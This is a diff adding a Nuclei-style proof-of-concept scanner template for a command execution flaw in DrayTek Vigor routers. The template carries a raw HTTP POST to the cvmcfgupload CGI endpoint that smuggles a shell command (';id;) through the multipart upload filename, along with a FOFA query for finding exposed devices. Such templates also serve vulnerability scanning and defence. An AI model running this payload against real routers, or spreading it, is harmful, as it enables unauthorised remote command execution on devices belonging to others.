@@ -1,0 +1,43 @@
+id: poc-hqn7knwnn07vcotd
+info:
+  name: DrayTekVigor cvmcfgupload存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hqn7knwnn07vcotd'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hqn7knwnn07vcotd
+    fofa: body="excanvas.js" && "lang == \"zh-cn\"" && "detectLang" && server=="DWS"
+http:
+- raw:
+  - 'POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15
+
+    Connection: keep-alive
+
+    Content-Length: 362
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="abc"; filename="t'';id;echo ''1_"
+
+    Content-Type: text/x-python-script
+
+
+    123
+
+    ------WebKitFormBoundary--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
